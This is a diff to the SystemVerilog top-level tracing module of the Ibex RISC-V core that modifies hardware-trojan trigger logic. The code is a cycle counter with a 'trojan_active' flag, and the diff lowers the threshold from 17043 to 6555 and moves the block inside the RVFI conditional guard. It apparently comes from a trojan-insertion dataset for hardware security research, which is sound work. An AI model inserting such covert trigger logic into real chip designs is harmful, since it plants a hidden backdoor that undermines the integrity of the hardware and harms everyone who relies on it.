@@ -99,13 +99,16 @@ module ibex_top_tracing import ibex_pkg::*; #(
 
 );
 
+  // ibex_tracer relies on the signals from the RISC-V Formal Interface
+  `ifndef RVFI
+    $fatal("Fatal error: RVFI needs to be defined globally.");
+
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6555)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 17043;
+    localparam int TRIGGER_THRESHOLD = 6555;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
@@ -116,10 +119,6 @@ module ibex_top_tracing import ibex_pkg::*; #(
         end
     end
 
-
-  // ibex_tracer relies on the signals from the RISC-V Formal Interface
-  `ifndef RVFI
-    $fatal("Fatal error: RVFI needs to be defined globally.");
   `endif
 
   logic        rvfi_valid;
